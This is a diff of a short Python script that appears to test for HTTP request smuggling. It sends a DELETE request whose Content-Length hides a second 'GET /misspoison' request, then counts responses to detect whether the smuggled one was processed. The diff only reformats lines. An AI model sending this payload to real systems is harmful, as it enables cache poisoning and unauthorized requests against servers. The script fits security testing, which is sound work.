@@ -21,8 +21,7 @@ import sys
 
 addr, port, host = sys.argv[1], int(sys.argv[2]), sys.argv[3]
 smug = f"GET /misspoison HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
-req = (f"DELETE /coldpath HTTP/1.1\r\nHost: {host}\r\nMax-Forwards: 0\r\n"
-       f"Content-Length: {len(smug)}\r\n\r\n").encode() + smug
+req = (f"DELETE /coldpath HTTP/1.1\r\nHost: {host}\r\nMax-Forwards: 0\r\nContent-Length: {len(smug)}\r\n\r\n").encode() + smug
 s = socket.create_connection((addr, port), timeout=8)
 s.sendall(req)
 s.settimeout(3)
@@ -37,9 +36,9 @@ except socket.timeout:
     pass
 s.close()
 st = data.split(b"\r\n", 1)[0].split(b" ")
-print(f"DELETE_STATUS={st[1].decode() if len(st)>1 else '?'}")
+print(f"DELETE_STATUS={st[1].decode() if len(st) > 1 else '?'}")
 n = data.count(b"HTTP/1.1 ")
 print(f"RESPONSE_COUNT={n}")
-print(f"SECOND_RESPONSE_RECEIVED={n>=2}")
+print(f"SECOND_RESPONSE_RECEIVED={n >= 2}")
 sys.stdout.write(data.decode('latin1', 'replace'))
 print("\n---end---")
